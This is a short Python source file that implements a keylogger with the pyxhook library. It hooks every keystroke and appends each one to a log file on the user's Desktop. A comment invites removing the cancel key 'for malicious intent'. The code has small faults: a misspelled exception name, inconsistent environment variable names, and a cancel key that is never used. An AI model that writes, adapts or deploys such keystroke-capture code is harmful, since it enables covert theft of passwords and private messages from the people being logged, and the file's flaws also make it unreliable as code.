import os
import pyxhook

#log file save location
log_file = os.environ.get('psylogger_file',os.path.expanduser('~/Desktop/file.log'))

#cancel key for the keylogger, may be removed for malicious intent
cancel_key = ord(os.environ.get( 'pylogger_cancel',  '`')[0] )

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnviornmentError:
        pass

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

new_hook.HookKeyboard()
try:
    new_hook.start()         # start the hook
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))



